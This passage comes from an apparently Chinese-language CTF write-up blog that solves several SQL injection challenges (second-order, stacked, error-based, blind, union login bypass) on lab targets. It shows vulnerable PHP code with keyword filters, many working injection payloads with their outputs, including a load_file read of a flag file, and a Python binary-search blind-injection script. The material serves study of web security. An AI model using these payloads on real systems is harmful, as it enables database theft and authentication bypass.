class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>confirm.php</code>中对输入的username和phone都进行了过滤了，但是忽略了address字段。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = $_POST[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>change.php</code>从数据库中取出了在<code>confirm.php</code>输入的<code>address</code>，这样就造成了二次注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下报错注入攻击语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;如果flag太长的话，通过改变substr的起始值，就可以把flag剩下的部分查出来</span><br></pre></td></tr></table></figure><h2 id="SUCTF2019-EasySQL">SUCTF2019 EasySQL</h2><h3 id="考点-v4">考点</h3><ul><li><p>堆叠注入</p></li><li><p>sql_mode参数</p><blockquote><p>Oracle 在缺省情况下支持使用 <code>&quot; || &quot;</code>连接字符串 ， <strong>但是在MySQL中缺省不支持</strong> ，MySQL 缺省使用 CONCAT 系列函数来连接字符串</p></blockquote></li></ul><h3 id="解题-v4">解题</h3><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144001.png" style="zoom:67%;" /><p>FUZZ后发现过滤了不少关键字，可以输入单个数字，输出的语句应该是用<code>var_dump()</code>函数，考虑堆叠注入。</p><p>读取当前数据表：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144413.png" alt=""></p><p>但是Flag也被过滤了。据说比赛的时候泄露源码了。。。</p><p><strong>连接数据库并从URL获取参数</strong></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144958.png" alt=""></p><p><strong>对获取的参数进行处理后带入数据库查询 ， 并且返回结果</strong></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145024.png" alt=""></p><p>其实主要就是 SQL 查询语句 : <strong><code>select &quot;.$post['query'].&quot;||flag from Flag&quot;;</code></strong></p><p>可以通过修改 sql_mode 模式 : <strong>PIPES_AS_CONCAT</strong> 来实现将 <code>&quot; || &quot;</code>视为 <strong>字符串连接符</strong> 而非 <strong>或</strong> 运算符。</p><p>payload：<code>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1</code></p><p>拼接后就变成了 <code>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145626.png" alt=""></p><h3 id="非预期">非预期</h3><p>Payload : <code>\*,1</code></p><p>拼接后就变成了 <code>SELECT \* ,1 || flag FROM Flag</code></p><h2 id="极客大挑战-2019-EasySQL">极客大挑战 2019 EasySQL</h2><h2 id="极客大挑战-2019-LoveSQL">极客大挑战 2019 LoveSQL</h2><h2 id="极客大挑战-2019-BabySQL">极客大挑战 2019 BabySQL</h2><h2 id="极客大挑战2019-HardSQL">极客大挑战2019 HardSQL</h2><h3 id="考点-v5">考点</h3><ul><li>MySQL报错注入</li></ul><h3 id="解题-v5">解题</h3><p>关键词FUZZ一下发现过滤了空格，or，update，handler，/，=等常见字符，这个时候可以试一下报错注入，直接上payload：</p><p>爆数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))#</span><br><span class="line">&#x2F;&#x2F; geek</span><br></pre></td></tr></table></figure><p>爆数据表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#</span><br><span class="line">&#x2F;&#x2F; H4rDsq1</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))#</span><br><span class="line">&#x2F;&#x2F; id,username,password</span><br></pre></td></tr></table></figure><p>爆值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b8</span><br></pre></td></tr></table></figure><p>发现显示不完全，substr()函数无效，可以使用reverse()函数翻转：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(reverse((select(password)from(H4rDsq1)))))))#</span><br><span class="line">&#x2F;&#x2F; &#125;007f9f56108b-520b-1094-6d9d-e1</span><br></pre></td></tr></table></figure><p>也可以使用left()和right()函数绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; e-d9d6-4901-b025-b80165f9f700&#125;</span><br></pre></td></tr></table></figure><h2 id="极客大挑战2019-FinalSQL">极客大挑战2019 FinalSQL</h2><h3 id="考点-v6">考点</h3><ul><li>MySQL regx盲注</li></ul><h3 id="解题-v6">解题</h3><p>进入题目给了几个hint，首先确定是盲注，当id=6的时候回显<code>Clever! But not this table.</code>。</p><p>登录框经过测试后没有可注入的点，尝试id参数后发现过滤空格，/**/以及if等关键字。测试注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6^length(database())&gt;0</span><br></pre></td></tr></table></figure><p>回显<code>Clever! But not this table.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6^length(database())&lt;0</span><br></pre></td></tr></table></figure><p>回显<code>ERROR</code></p><p>由于过滤了if关键字，所以要使用regex盲注，示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;0)^1</span><br></pre></td></tr></table></figure><p>确定注入点和payload形式后开始编写盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://410b10a4-249a-4d9b-b1df-03f557672625.node3.buuoj.cn/search.php?id=6&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Clever! But not this table.&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        response = requests.get(url + payload.format(index=i, char=mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabysqliV1">GXYCTF2019 BabysqliV1</h2><blockquote><p>原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</p><p>(BUUCTF没有提示啊!!!)</p></blockquote><h3 id="考点-v7">考点</h3><ul><li>SQL联合查询</li></ul><h3 id="解题-v7">解题</h3><p>先FUZZ一波过滤了某些字符，常规的注入都没能pass，查看源码发现一个<code>search.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200621142049.png" alt=""></p><blockquote><p>先说说base32 和 base64 的区别，<br>base32 只有大写字母和数字数字组成，或者后面有三个等号。<br>base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。<br>明显，那段文字是base32加密</p></blockquote><p>解密后：<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p><p>继续base64解密：<code>select * from user where username = '$name'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39; or 1&#x3D;1#&amp;pw&#x3D;1  &#x2F;&#x2F; wrong user!    </span><br><span class="line">&gt;&gt;&gt; do not hack me!  &#x2F;&#x2F; or和&#x3D;被过滤了</span><br><span class="line">name&#x3D;1&#39; Or 1#&amp;pw&#x3D;1   &#x2F;&#x2F; 大小写直接绕过了</span><br><span class="line">name&#x3D;1&#39; Or 1 Order by 4#&amp;pw&#x3D;1</span><br><span class="line">&gt;&gt;&gt; Error: Unknown column &#39;4&#39; in &#39;order clause&#39; &#x2F;&#x2F;可以知道有三个column</span><br></pre></td></tr></table></figure><p>盲猜字段名为<code>id</code>、<code>username</code>、<code>password</code>，当<code>username</code>为<code>admin</code>时会说<code>wrong pass!</code>，其他都是<code>wrong user!</code>，username应该就是<code>admin</code>了。</p><p>那么逻辑就是：<strong>先判断<code>username</code>在不在数据库,再判断密码对不对</strong>，这样我们就可以通过联合查询的时候会创一个虚拟的表单，让他查这个虚拟表。</p><p>下面猜测admin在哪个字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39;union select 1,&#39;admin&#39;,3#</span><br></pre></td></tr></table></figure><p>我们知道有admin用户的，经测试<code>name=1'union select 1,'admin',3#</code>报密码错误，说明这里就是username了，password字段应该是3的位置。</p><p>这道题得猜它的后端源码是怎么写的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$passwd = md5($_POST[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;Wrong Pass&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于name参数可注，我们可以构造sql语句使其查询为假，然后联合查询出一个比如<code>0f5ed8a8d8d44d86a570aacffa922251</code>(ca01h的md5)，然后密码输入<code>ca01h</code>，就会查询成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username &#x3D; 1&#39; union select 1,&#39;admin&#39;,&#39;0f5ed8a8d8d44d86a570aacffa922251&#39;#</span><br><span class="line">password &#x3D; ca01h</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://www.gem-love.com/ctf/453.html">https://www.gem-love.com/ctf/453.html</a></p></blockquote><h2 id="RCTF2015-EasySQL">RCTF2015 EasySQL</h2><h3 id="考点-v8">考点</h3><ul><li>报错注入</li><li>二次注入</li></ul><h3 id="解题-v8">解题</h3><p>主要有三个功能，注册、登录和修改密码，这种情况一般都是二次注入的问题。</p><p>在注册页面，试了一下，<code>username</code> 和 <code>email</code> 处有过滤，直接 fuzz 一下哪些字符被禁了</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212053.png" alt=""></p><p>注册用户名<code>zzz\</code>，在点击修改密码后，有一个报错：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212223.png" alt=""></p><p>猜测SQL语句应该是这样写的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;zzz\&quot; and pwd &#x3D; &#39;92dd83acc13018d34e2454d4c5c05cf3&#39;</span><br></pre></td></tr></table></figure><p>使用报错注入的方式爆出数据</p><ul><li><p>获取当前用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~root@localhost~'</code></p></li><li><p>查看当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~web_sqli~'</code></p></li><li><p>查看数据库的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~article,flag,users~'</code></p></li><li><p>查看<code>users</code>表中的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~name,pwd,email,real_flag_1s_her'</code></p><p>使用reverse函数查看后面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~ereh_s1_galf_laer,liame,dwp,ema'</code></p></li><li><p>查看<code>real_flag_1s_here</code>字段的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'</code></p><p>看到有很多垃圾数据，用<code>regexp</code>匹配<code>f</code>开头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~flag&#123;e43ad246-f211-4292-a531-c3'</code></p><p>再用reverse函数读后面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure><p>返回<code>XPATH syntax error: '~&#125;04c7d828343c-135a-2924-112f-64'</code></p></li></ul><h2 id="GYCTF2020-Ezsqli">GYCTF2020 Ezsqli</h2><h3 id="考点-v9">考点</h3><ul><li>无information_schema布尔盲注</li><li>无列名注入</li></ul><h3 id="解题-v9">解题</h3><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714113824.png" style="zoom: 50%;" /><p>过滤很多东西，比如information_schema、union…select、join、if、and、or等等，基本上就是考虑盲注了。</p><p>另外还发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">返回V&amp;N</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||1&#x3D;1</span><br><span class="line">返回Nu1l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||1&#x3D;5</span><br><span class="line">返回V&amp;N</span><br></pre></td></tr></table></figure><p>也就是说，本来2查询的是V&amp;N，如果<code>||</code>后面的表达式为True则返回Nu1L、false则返回V&amp;N。</p><p>判断一下是不是盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||length(database())&gt;0</span><br><span class="line">返回Nu1l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||length(database())&lt;0</span><br><span class="line">返回V&amp;N</span><br></pre></td></tr></table></figure><p>确定是盲注了，那么就直接写脚本用二分法盲注表名，可以使用sys.schema_table_statistics_with_buffer</p><blockquote><p>innodb_table_stats和innodb_index_stats和sys.schema_table_statistics也可以使用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 